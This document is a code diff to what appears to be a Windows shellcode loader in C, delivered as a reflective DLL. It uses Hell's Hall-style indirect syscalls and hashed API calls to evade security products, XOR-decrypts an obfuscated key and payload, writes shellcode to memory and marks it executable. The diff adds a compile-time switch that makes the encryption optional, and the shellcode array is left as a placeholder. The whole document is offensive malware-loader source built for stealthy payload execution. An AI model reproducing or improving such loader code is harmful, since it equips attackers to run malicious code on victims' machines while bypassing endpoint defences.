@@ -1,10 +1,12 @@
-#include "../Include/hashycalls.h"
-#include "../Include/HellsHall.h"
+# include "../Include/hashycalls.h"
+# include "../Include/HellsHall.h"
 
-#define REFLECTIVE_FUNCTION_NAME IyKebSSlaSsdfyD
+# define REFLECTIVE_FUNCTION_NAME IyKebSSlaSsdfyD
 
-#define INTERNET_FLAG_HYPERLINK 0x00000400
-#define INTERNET_FLAG_IGNORE_CERT_DATE_INVALID  0x00002000
+# define INTERNET_FLAG_HYPERLINK 0x00000400
+# define INTERNET_FLAG_IGNORE_CERT_DATE_INVALID  0x00002000
+
+# define USE_ENCRYPTION
 
 typedef BOOL(WINAPI* fnDllMain)(HINSTANCE, DWORD, LPVOID);
 
@@ -174,6 +176,7 @@ extern __declspec(dllexport) BOOL REFLECTIVE_FUNCTION_NAME() {
     return DllMainFunc((HMODULE)NewDllBaseAddr, DLL_PROCESS_ATTACH, NULL);
 }
 
+# ifdef USE_ENCRYPTION
 VOID Xor(PBYTE pData, SIZE_T SizeOfData, PBYTE pKey, SIZE_T SizeOfKey) {
     for (int i = 0, j = 0; i < SizeOfData; i++, j++) {
         if (j >= SizeOfKey) {
@@ -198,7 +201,7 @@ PBYTE DecryptKey(BYTE HintByte, PBYTE EncryptedKey, SIZE_T KeySize, PSYSTEM_CALL
     }
     return OriginalKey;
 }
-
+# endif
 
 VOID Payload() {
 
@@ -208,11 +211,13 @@ VOID Payload() {
                         Payload         = 0;
     SYSTEM_CALLS_TABLE  SyscallTable    = { 0 };
 
+# ifdef USE_ENCRYPTION
     BYTE                HintByte        = 0x00;
 
     char Key[]          = { 0x00 };
+# endif
 
-    char shellcode[]    = { 0x00 };
+	char shellcode[]    = { 0x00 };
 
     SIZE_T PayloadSize = sizeof(shellcode);
 
@@ -221,9 +226,10 @@ VOID Payload() {
         return;
 
     /* Decrypt the shellcode encryption key */
+# ifdef USE_ENCRYPTION
     if ((DecryptedKey = DecryptKey(HintByte, Key, sizeof(Key), &SyscallTable)) == NULL)
         return;
-
+# endif
     /* Allocate & write encrypted shellcode to memory */
     if ((NtAllocateVirtualMemory(&SyscallTable, (HANDLE)-1, &Payload, 0, &PayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) != 0x0)
         return;
@@ -232,7 +238,9 @@ VOID Payload() {
         return;
 
     /* Decrypt shellcode */
+# ifdef USE_ENCRYPTION
     Xor(Payload, sizeof(shellcode), DecryptedKey, sizeof(Key));
+# endif
 
     /* Set memory protections on payload to execute */
     if ((NtProtectVirtualMemory(&SyscallTable, (HANDLE)-1, &Payload, &PayloadSize, PAGE_EXECUTE, &OldProtection)) != 0x0)
